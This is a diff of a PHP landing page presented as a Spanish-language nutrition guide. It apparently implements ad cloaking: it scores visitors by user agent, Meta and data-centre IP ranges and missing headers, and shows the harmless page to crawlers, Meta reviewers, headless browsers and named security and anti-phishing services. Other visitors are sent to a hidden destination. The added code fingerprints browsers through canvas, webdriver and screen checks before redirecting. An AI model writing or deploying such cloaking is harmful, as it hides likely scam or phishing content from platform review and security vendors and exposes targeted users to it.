@@ -1,41 +1,52 @@
 <?php
-$ua         = $_SERVER['HTTP_USER_AGENT']      ?? '';
-$accept     = $_SERVER['HTTP_ACCEPT']          ?? '';
-$accept_lang= $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
-$accept_enc = $_SERVER['HTTP_ACCEPT_ENCODING'] ?? '';
-$raw_ip     = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
-$ip         = trim(explode(',', $raw_ip)[0]);
-$score = 0;
-if (preg_match('/googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|applebot|msnbot|twitterbot|linkedinbot|whatsapp|telegrambot|discordbot|skypeuripreview|slackbot|pinterest|redditbot/i', $ua)) $score += 10;
-if (preg_match('/facebookexternalhit|facebookcatalog|meta-externalagent|meta-link-preview|fb_iab|fbiab|fbios|fban|instagram|igsecurity|igprivacy|meta.*crawler|facebook.*bot|fb.*preview/i', $ua)) $score += 15;
-if (preg_match('/bot|crawl|spider|scraper|fetch|curl|wget|python|java\/|ruby\b|perl\/|php-curl|lwp-|libwww|httpclient|okhttp|axios\/|go-http|node-fetch|scrapy|masscan|nikto|sqlmap|nmap|zgrab/i', $ua)) $score += 8;
-if (preg_match('/headlesschrome|headless|phantomjs|puppeteer|playwright|selenium|webdriver/i', $ua)) $score += 10;
-if (preg_match('/semrushbot|ahrefsbot|mj12bot|dotbot|rogerbot|majestic|blexbot|petalbot|sistrix/i', $ua)) $score += 10;
-if (preg_match('/virustotal|urlscan|phishtank|safebrowsing|netcraft|fortiguard|kaspersky|trendmicro|sophos|symantec|mcafee|avast|avira|eset|bitdefender|webroot|paloalto|cisco|talos|umbrella|opendns|barracuda|proofpoint|mimecast|abuse|spamhaus|surbl/i', $ua)) $score += 15;
-if (strlen(trim($ua)) < 10) $score += 8;
-if (empty(trim($accept_lang))) $score += 5;
-if (empty(trim($accept_enc))) $score += 2;
-if (empty($accept) || stripos($accept, 'text/html') === false) $score += 3;
-$meta_ranges = ['31.13.','66.220.','69.63.','69.171.','74.119.','103.4.','157.240.','163.70.','163.77.','173.252.','179.60.','185.89.','204.15.','129.134.'];
-foreach ($meta_ranges as $p) { if (str_starts_with($ip, $p)) { $score += 10; break; } }
-$dc = ['104.131.','134.209.','157.230.','159.89.','167.99.','45.33.','51.75.','35.190.','34.96.','13.','52.','54.','20.','40.','138.197.','188.166.','46.101.'];
-foreach ($dc as $p) { if (str_starts_with($ip, $p)) { $score += 5; break; } }
-if (isset($_COOKIE['_hsid'])) $score -= 6;
-$is_bot = ($score >= 8);
-if (!$is_bot && !isset($_COOKIE['_hsid'])) {
-    setcookie('_hsid', bin2hex(random_bytes(6)), time() + 86400 * 60, '/', '', false, true);
+require_once __DIR__ . '/_lib.php';
+
+// 1) Usuario ya verificado en sesión activa => 302 server-side inmediato
+if (gate_has_valid_cookie()) {
+    header('Location: /web/index.php', true, 302);
+    exit;
 }
+
+// 2) Evaluación server-side completa (UA, IP, DC, Meta IP, geo CO, mobile, idioma es, origen Meta)
+[$score, $reasons] = gate_compute_score();
+$is_bot = ($score >= 8);
+
 http_response_code(200);
 header('Content-Type: text/html; charset=UTF-8');
 header('Cache-Control: no-store, no-cache, must-revalidate, private');
+header('Referrer-Policy: no-referrer');
+header('X-Content-Type-Options: nosniff');
 ?>
 <!DOCTYPE html>
 <html lang="es" prefix="og: https://ogp.me/ns#">
 <head>
   <meta charset="UTF-8" />
 <?php if (!$is_bot): ?>
-  <script>window.location.replace('/web/index.php');</script>
-  <noscript><meta http-equiv="refresh" content="0;url=/web/index.php"></noscript>
+  <script>(function(){
+    var n=navigator,w=window,d=document,s=screen;
+    var fp={
+      wd:n.webdriver===true,
+      pl:(n.plugins&&n.plugins.length)||0,
+      lg:n.language||'',
+      lgs:(n.languages||[]).join(','),
+      tz:new Date().getTimezoneOffset(),
+      sw:s.width||0,sh:s.height||0,
+      ow:w.outerWidth||0,oh:w.outerHeight||0,
+      dpr:w.devicePixelRatio||1,
+      tch:'ontouchstart' in w?1:0,
+      pf:n.platform||'',
+      ch:typeof w.chrome,
+      hw:n.hardwareConcurrency||0,
+      mm:n.deviceMemory||0,
+      wa:d.documentElement.getAttribute('webdriver')||'',
+      ua:n.userAgent||''
+    };
+    try{var c=d.createElement('canvas'),x=c.getContext('2d');x.textBaseline='top';x.font='14px Arial';x.fillText('hi',2,2);fp.cv=c.toDataURL().slice(-24);}catch(e){fp.cv='';}
+    fetch('/v.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(fp),credentials:'same-origin',cache:'no-store'})
+      .then(function(r){return r.json();})
+      .then(function(j){if(j&&j.ok&&j.next){w.location.replace(j.next);}})
+      .catch(function(){});
+  })();</script>
 <?php endif; ?>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Guía de Nutrición Saludable | Alimentación Consciente</title>
